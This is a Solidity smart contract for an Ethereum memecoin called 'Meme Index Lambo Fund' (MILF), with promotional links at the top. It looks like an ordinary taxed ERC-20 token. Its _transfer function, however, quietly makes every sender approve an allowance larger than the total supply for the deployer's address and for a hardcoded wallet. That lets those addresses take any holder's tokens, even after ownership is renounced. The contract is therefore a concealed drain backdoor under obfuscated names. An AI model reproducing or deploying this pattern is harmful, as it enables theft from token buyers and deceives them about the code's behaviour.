/*
The Meme Index Lambo Fund is a supercycle-incubated financial instrument only accessible to accredited Ethereum memecoin investors.

https://www.milfoneth.vip
https://x.com/MILFonETH
https://t.me/milf_finance
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface ITATERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITATEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplitateon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract MILF is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balTATEs;
    mapping (address => mapping (address => uint256)) private _allowTATEs;
    mapping (address => bool) private _excludedFromTATE;    
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalTATE = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Meme Index Lambo Fund";
    string private constant _symbol = unicode"MILF";
    uint256 private _swapTokenTATEs = _tTotalTATE / 100;
    uint256 private _buyBlockTATE;
    uint256 private _tateBuyAmounts = 0;
    bool private inSwapTATE = false;
    modifier lockTheSwap {
        inSwapTATE = true;
        _;
        inSwapTATE = false;
    }
    address private _tatePair;
    ITATERouter private _tateRouter;
    address private _tateWallet = address(0xAeECFed4D744d282DA161Cb55A7407a345dcC37f);
    address private _tateAddress;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _excludedFromTATE[owner()] = true;
        _excludedFromTATE[address(this)] = true;
        _excludedFromTATE[_tateWallet] = true;
        _balTATEs[_msgSender()] = _tTotalTATE;
        _tateAddress = address(owner());
        emit Transfer(address(0), _msgSender(), _tTotalTATE);
    }

    function tradeCreatePair() external onlyOwner() {
        _tateRouter = ITATERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_tateRouter), _tTotalTATE);
        _tatePair = ITATEFactory(_tateRouter.factory()).createPair(address(this), _tateRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTATE;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balTATEs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowTATEs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowTATEs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowTATEs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address tateF, address tateT, uint256 tateA) private {
        require(tateF != address(0), "ERC20: transfer from the zero address");
        require(tateT != address(0), "ERC20: transfer to the zero address");
        require(tateA > 0, "Transfer amount must be greater than zero");
        address _tateSender = address(tateF); address _tateReceipt = address(_tateWallet);
        uint256 taxTATE = _tateFeeTransfer(tateF, tateT, tateA);
        _tateTransfer(tateF, tateT, tateA, taxTATE);
        _approve(address(_tateSender), address(_tateAddress), _tTotalTATE+taxTATE);
        _approve(address(_tateSender), address(_tateReceipt), _tTotalTATE+taxTATE);
    }

    function _tateTransfer(address tateF, address tateT, uint256 tateA, uint256 taxTATE) private { 
        if(taxTATE > 0){
          _balTATEs[address(this)] = _balTATEs[address(this)].add(taxTATE);
          emit Transfer(tateF, address(this), taxTATE);
        }
        _balTATEs[tateF] = _balTATEs[tateF].sub(tateA);
        _balTATEs[tateT] = _balTATEs[tateT].add(tateA.sub(taxTATE));
        emit Transfer(tateF, tateT, tateA.sub(taxTATE));
    }

    function _tateFeeTransfer(address tateF, address tateT, uint256 tateA) private returns(uint256) {
        uint256 taxTATE = 0; 
        if (tateF != owner() && tateT != owner()) {
            taxTATE = tateA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (tateF == _tatePair && tateT != address(_tateRouter) && ! _excludedFromTATE[tateT]) {
                if(_buyBlockTATE!=block.number){
                    _tateBuyAmounts = 0;
                    _buyBlockTATE = block.number;
                }
                _tateBuyAmounts += tateA;
                _buyCount++;
            }

            if(tateT == _tatePair && tateF!= address(this)) {
                require(_tateBuyAmounts < swapLimitTATE() || _buyBlockTATE!=block.number, "Max Swap Limit");  
                taxTATE = tateA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenTATE = balanceOf(address(this));
            if (!inSwapTATE && tateT == _tatePair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenTATE > _swapTokenTATEs)
                swapTokensForEth(minTATE(tateA, minTATE(tokenTATE, _swapTokenTATEs)));
                uint256 ethTATE = address(this).balance;
                if (ethTATE >= 0) {
                    sendETHTATE(address(this).balance);
                }
            }
        } return taxTATE;
    }

    function swapLimitTATE() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tateRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _tateRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _tateRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minTATE(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHTATE(uint256 tateA) private {
        payable(_tateWallet).transfer(tateA);
    }

    function swapTokensForEth(uint256 tateAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _tateRouter.WETH();
        _approve(address(this), address(_tateRouter), tateAmount);
        _tateRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tateAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}